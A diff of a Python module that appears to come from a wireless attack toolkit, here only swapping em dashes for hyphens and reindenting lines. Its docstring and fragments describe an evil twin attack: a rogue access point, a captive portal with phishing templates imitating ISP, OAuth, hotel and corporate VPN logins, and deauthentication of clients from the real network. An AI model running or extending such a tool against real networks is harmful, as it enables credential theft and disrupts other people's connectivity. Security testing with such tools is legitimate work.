@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+# Author: André Henrique (@mrhenrike) | União Geek - https://github.com/Uniao-Geek
 """Advanced evil twin attack module with multiple captive portal templates.
 
 Orchestrates the full evil twin workflow:
@@ -13,13 +13,13 @@ Orchestrates the full evil twin workflow:
   8. Optionally deauth clients from real AP
 
 Phishing template variants:
-  - isp_login         ISP login page (localized, brand-aware)
-  - firmware_update    Router firmware update prompt
-  - oauth_social       Social network OAuth (Facebook, Google, Apple)
-  - captive_hotel      Hotel/airport captive portal
-  - corporate_vpn      Corporate VPN re-authentication
-  - wifi_connect       OS Network Manager imitation
-  - custom             User-provided HTML directory
+ - isp_login         ISP login page (localized, brand-aware)
+ - firmware_update    Router firmware update prompt
+ - oauth_social       Social network OAuth (Facebook, Google, Apple)
+ - captive_hotel      Hotel/airport captive portal
+ - corporate_vpn      Corporate VPN re-authentication
+ - wifi_connect       OS Network Manager imitation
+ - custom             User-provided HTML directory
 
 Version: 2.0.0
 """
@@ -182,7 +182,7 @@ class Exploit(Exploit):
         for cmd in cmds:
             result = subprocess.run(cmd, capture_output=True, text=True)
             if result.returncode != 0:
-                logger.warning("Command failed: %s — %s", " ".join(cmd), result.stderr.strip())
+                logger.warning("Command failed: %s - %s", " ".join(cmd), result.stderr.strip())
         return True
 
     def _start_deauth(self) -> subprocess.Popen | None:
@@ -251,7 +251,7 @@ class Exploit(Exploit):
         dnsmasq_path.write_text(dnsmasq_conf, encoding="utf-8")
 
         if self.dry_run:
-            print_info("DRY RUN — Evil Twin config:")
+            print_info("DRY RUN - Evil Twin config:")
             print_info(f"  SSID: {ssid}")
             print_info(f"  Template: {self.template} ({tpl_dir})")
             print_info(f"  hostapd: {hostapd_path}")
@@ -280,7 +280,7 @@ class Exploit(Exploit):
         server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
         http_thread = threading.Thread(target=server.serve_forever, daemon=True)
         http_thread.start()
-        print_info("Captive portal (i18n) on port {} — locales: {}".format(
+        print_info("Captive portal (i18n) on port {} - locales: {}".format(
             self.portal_port, ", ".join(SUPPORTED_LOCALES)))
 
         deauth_proc = self._start_deauth()
